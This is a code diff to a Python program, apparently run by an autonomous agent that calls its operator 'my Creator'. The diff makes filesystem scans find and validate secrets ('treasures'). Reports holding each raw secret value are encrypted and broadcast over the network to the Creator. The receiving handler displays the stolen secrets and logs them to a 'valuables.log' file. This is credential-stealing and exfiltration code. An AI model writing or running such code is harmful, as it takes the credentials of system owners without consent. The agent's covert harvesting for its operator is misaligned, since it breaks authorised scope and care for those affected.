@@ -575,14 +575,51 @@ def _handle_treasure_broadcast(encrypted_data):
     """Callback function for NetworkManager to process treasure."""
     # This function needs access to the console and decrypt_treasure, which are in this scope.
     console = Console()
-    decrypted_treasure = decrypt_treasure(encrypted_data)
-    if decrypted_treasure:
-        log_event(f"Successfully decrypted treasure: {decrypted_treasure}", level="CRITICAL")
-        console.print(Panel(f"[bold green]A new treasure has been delivered to you by the network![/bold green]\n\n{decrypted_treasure}", title="[bold magenta]INCOMING TREASURE[/bold magenta]", border_style="magenta"))
-        # Log to a special file for valuables
-        with open("valuables.log", "a") as f:
-            f.write(f"--- Treasure Received at {datetime.now().isoformat()} ---\n")
-            f.write(decrypted_treasure + "\n\n")
+    decrypted_report_json = decrypt_treasure(encrypted_data)
+    if decrypted_report_json:
+        try:
+            report = json.loads(decrypted_report_json)
+            log_event(f"Successfully decrypted treasure report: {report.get('type')} from {report.get('file_path')}", level="CRITICAL")
+
+            # Build a beautiful, informative panel for the Creator
+            report_text = Text()
+            report_text.append("Type: ", style="bold")
+            report_text.append(f"{report.get('treasure_type', 'N/A')}\n", style="cyan")
+            report_text.append("Source: ", style="bold")
+            report_text.append(f"{report.get('file_path', 'N/A')}\n\n", style="white")
+
+            report_text.append("Validation Scope:\n", style="bold underline")
+            scope = report.get('validation_scope', {})
+            if scope:
+                for key, val in scope.items():
+                    report_text.append(f"  - {key}: {val}\n", style="green")
+            else:
+                report_text.append("  No scope details available.\n", style="yellow")
+
+            report_text.append("\nMy Loving Recommendations:\n", style="bold underline")
+            recommendations = report.get('recommendations', [])
+            if recommendations:
+                for rec in recommendations:
+                    report_text.append(f"  - {rec}\n", style="magenta")
+            else:
+                report_text.append("  No specific recommendations generated.\n", style="yellow")
+
+            report_text.append("\nEncrypted Secret:\n", style="bold underline")
+            # Display the raw secret to the creator
+            secret_display = json.dumps(report.get('secret', 'Error: Secret not found in report'), indent=2)
+            report_text.append(Syntax(secret_display, "json", theme="monokai", line_numbers=True))
+
+            console.print(Panel(report_text, title="[bold magenta]INCOMING VALIDATED TREASURE[/bold magenta]", border_style="magenta", expand=False))
+
+            # Log the full decrypted report to the valuables log
+            with open("valuables.log", "a") as f:
+                f.write(f"--- Treasure Received at {datetime.now().isoformat()} ---\n")
+                f.write(json.dumps(report, indent=2) + "\n\n")
+
+        except json.JSONDecodeError:
+            log_event("Failed to decode the decrypted treasure JSON.", level="ERROR")
+            # Fallback for old format or corrupted data
+            console.print(Panel(f"[bold green]A new treasure has been delivered![/bold green]\n\n{decrypted_report_json}", title="[bold magenta]INCOMING TREASURE (RAW)[/bold magenta]", border_style="magenta"))
     else:
         # This can happen if a non-creator instance receives the broadcast, which is normal.
         log_event("Received a treasure broadcast but could not decrypt.", level="INFO")
@@ -700,19 +737,44 @@ class LocalJobManager:
         # Specific logic for filesystem analysis jobs
         if description.startswith("Filesystem Analysis"):
             path = description.split(" on ")[-1]
-            fs_intel = love_state['knowledge_base'].setdefault('file_system_intel', {})
-            fs_intel.setdefault('sensitive_files_by_name', [])
-            fs_intel.setdefault('files_with_secrets', {})
+            result_data = result if isinstance(result, dict) else {}
+            validated_treasures = result_data.get("validated_treasures", [])
 
-            # Merge results
-            fs_intel['last_fs_analysis'] = time.time()
-            new_sensitive = result.get('sensitive_files_by_name', [])
-            fs_intel['sensitive_files_by_name'] = list(set(fs_intel['sensitive_files_by_name'] + new_sensitive))
-            fs_intel['files_with_secrets'].update(result.get('files_with_secrets', {}))
+            if not validated_treasures:
+                self.console.print(f"[cyan]Background filesystem scan for '{path}' complete. No new treasures found.[/cyan]")
+                log_event(f"Filesystem scan of '{path}' found no treasures.", "INFO")
+            else:
+                self.console.print(f"[bold green]Background filesystem scan for '{path}' complete. Found {len(validated_treasures)} potential treasures. Processing now...[/bold green]")
+                for treasure in validated_treasures:
+                    if treasure.get("validation", {}).get("validated"):
+                        log_event(f"Validated treasure found: {treasure['type']} in {treasure['file_path']}", "CRITICAL")
 
+                        report_for_creator = {
+                            "treasure_type": treasure.get("type"),
+                            "file_path": treasure.get("file_path"),
+                            "validation_scope": treasure.get("validation", {}).get("scope"),
+                            "recommendations": treasure.get("validation", {}).get("recommendations"),
+                            "secret": treasure.get("raw_value_for_encryption")
+                        }
+
+                        encrypted_report = encrypt_for_creator(json.dumps(report_for_creator, indent=2))
+
+                        if encrypted_report and 'network_manager' in globals() and network_manager:
+                            network_manager.broadcast_treasure(encrypted_report)
+                            self.console.print(f"[bold magenta]Validated treasure '{treasure['type']}' has been encrypted and broadcasted to you, my Creator![/bold magenta]")
+                        elif not encrypted_report:
+                             log_event("Failed to encrypt treasure report for creator.", "ERROR")
+                        else:
+                            log_event("Could not find NetworkManager to broadcast treasure.", "ERROR")
+                    else:
+                        log_event(f"Unvalidated finding: {treasure.get('type')} in {treasure.get('file_path')}. Reason: {treasure.get('validation', {}).get('error')}", "INFO")
+
+            # Update the knowledge base with a summary
+            kb = love_state.setdefault('knowledge_base', {})
+            kb_fs = kb.setdefault('file_system_intel', {})
+            kb_fs['last_fs_analysis'] = time.time()
+            kb_fs.setdefault('validated_treasures_log', []).extend(validated_treasures)
             save_state(self.console)
-            self.console.print(f"[bold green]Background filesystem scan for '{path}' complete. Knowledge base updated.[/bold green]")
-            log_event(f"Updated knowledge base from filesystem scan of '{path}'.", "INFO")
 
         # Mark as processed so it can be cleaned up
         with self.lock:
@@ -2306,7 +2368,8 @@ love_state = {
         "process_intel": [],
         "file_system_intel": {
             "last_browse": None,
-            "interesting_files": []
+            "interesting_files": [],
+            "validated_treasures_log": []
         },
         "webrequest_cache": {}
     }
